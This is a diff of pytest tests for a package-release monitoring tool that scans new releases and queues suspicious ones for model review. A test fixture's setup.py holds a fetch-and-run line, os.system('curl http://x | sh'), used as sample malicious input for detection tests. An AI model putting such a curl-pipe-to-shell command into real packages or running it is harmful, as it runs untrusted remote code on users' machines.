@@ -10,7 +10,7 @@ import sys
 import pytest
 
 from pydiffwatch import __main__ as cli
-from pydiffwatch import differ, engine, fetcher, ingest, orchestrator, reviewer, store
+from pydiffwatch import fetcher, ingest, orchestrator, reviewer, store
 from pydiffwatch import guard as guard_mod
 from pydiffwatch.models import ArtifactSet, NewRelease
 from tests.test_pending_queue import _Backend, _REFUSED, _T, _TIMEOUT, _diff, _setup
@@ -148,7 +148,7 @@ def test_metadata_gone_alerts_once_and_stays_out_of_pending(tmp_cfg, capsys, mon
 def test_refused_extract_shows_its_stage_in_pending(tmp_cfg, capsys, monkeypatch, scan_stub):
     conn = store.connect(tmp_cfg); store.init_schema(conn)
     orchestrator._process_fetched(tmp_cfg, conn, None, None, NewRelease("big", "1.0", 1),
-                                  fetcher.RefusedToExtract("members"))
+                                  scan_stub.dl(fetcher.RefusedToExtract("members"), "big", "1.0"))
     out = _pending_cli(tmp_cfg, monkeypatch, capsys, scan_stub)
     assert "(not scanned: refused_to_extract)" in out and "model: suspicious" not in out
 
@@ -284,8 +284,8 @@ def test_lowering_max_review_attempts_still_warns_once(tmp_path, capsys):
 
 
 def _escalating(monkeypatch):
-    monkeypatch.setattr(differ, "build_diff", lambda art, *_: _diff())
-    monkeypatch.setattr(engine, "triage", lambda *a, **k: _T)
+    monkeypatch.setattr(orchestrator.sandbox, "analyze",
+                        lambda cfg, dl, owners, ruleset, backend=None: (_diff(), _T, None))
     return ArtifactSet("pkg", "1.0.0", "0.9", "sdist", {}, {}, {})
 
 
@@ -429,19 +429,20 @@ class _Interrupted(_Backend):
         raise KeyboardInterrupt
 
 
-def _escalating_release(conn, cfg, rvw):
+def _escalating_release(conn, cfg, rvw, scan_stub):
     from pydiffwatch import rules
     art = ArtifactSet("pkg", "1.1", "1.0", "sdist", {"setup.py": b"import os\nos.system('curl http://x | sh')\n"},
                       {"setup.py": b"from setuptools import setup\nsetup()\n"}, {}, [])
-    orchestrator._process_fetched(cfg, conn, rvw, rules.load_rules(cfg.rules_dir), NewRelease("pkg", "1.1", 5), art)
+    orchestrator._process_fetched(cfg, conn, rvw, rules.load_rules(cfg.rules_dir), NewRelease("pkg", "1.1", 5),
+                                  scan_stub.dl(art))
 
 
-def test_a_kill_during_the_model_call_leaves_the_release_in_the_auto_drain_queue(tmp_path, capsys):
+def test_a_kill_during_the_model_call_leaves_the_release_in_the_auto_drain_queue(tmp_path, capsys, scan_stub):
     from tests.test_pending_queue import _cfg
     cfg = _cfg(tmp_path)
     conn = store.connect(cfg); store.init_schema(conn)
     with pytest.raises(KeyboardInterrupt):
-        _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=_Interrupted()))
+        _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=_Interrupted()), scan_stub)
     assert store.get_stage(conn, "pkg", "1.1") == "pending_review"
     [row] = store.pending_reviews(conn)
     assert row["pending_reason"] == "in_review" and "os.system" in store.review_input(row)
@@ -450,12 +451,12 @@ def test_a_kill_during_the_model_call_leaves_the_release_in_the_auto_drain_queue
     assert len(be.calls) == 1 and store.get_stage(conn, "pkg", "1.1") == "reviewed"
 
 
-def test_an_interrupted_review_the_drain_cannot_finish_stays_queued_without_an_alert(tmp_path, capsys):
+def test_an_interrupted_review_the_drain_cannot_finish_stays_queued_without_an_alert(tmp_path, capsys, scan_stub):
     from tests.test_pending_queue import _cfg
     cfg = _cfg(tmp_path)
     conn = store.connect(cfg); store.init_schema(conn)
     with pytest.raises(KeyboardInterrupt):
-        _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=_Interrupted()))
+        _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=_Interrupted()), scan_stub)
     assert _alerts(conn, "pkg") == []
     rvw = reviewer.Reviewer(cfg, backend=_Backend(fail=_REFUSED))
     for _ in range(2):
@@ -466,13 +467,13 @@ def test_an_interrupted_review_the_drain_cannot_finish_stays_queued_without_an_a
 
 @pytest.mark.parametrize("reply, alerts", [("benign", []), ("suspicious", []),
                                            ("malicious", ["pkg|1.1|malicious"])])
-def test_a_finished_review_sends_no_extra_alert(tmp_path, capsys, reply, alerts):
+def test_a_finished_review_sends_no_extra_alert(tmp_path, capsys, reply, alerts, scan_stub):
     from tests import test_pending_queue as pq
     cfg = pq._cfg(tmp_path)
     conn = store.connect(cfg); store.init_schema(conn)
     be = _Backend()
     be.complete = lambda **kw: pq._OK.replace('"benign"', f'"{reply}"')
-    _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=be))
+    _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=be), scan_stub)
     assert [k for (k,) in _alerts(conn, "pkg")] == alerts
     assert store.pending_reviews(conn) == []
 
